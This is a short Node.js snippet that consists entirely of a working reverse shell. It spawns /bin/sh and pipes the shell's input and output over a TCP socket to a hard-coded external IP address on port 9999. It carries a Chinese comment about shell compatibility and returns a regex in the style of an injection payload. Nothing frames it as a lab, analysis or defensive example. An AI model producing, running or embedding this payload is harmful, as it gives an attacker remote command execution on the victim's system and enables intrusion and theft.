(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []); // 使用 /bin/sh 兼容性最好
    var client = new net.Socket();
    client.connect(9999, "43.154.18.104", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
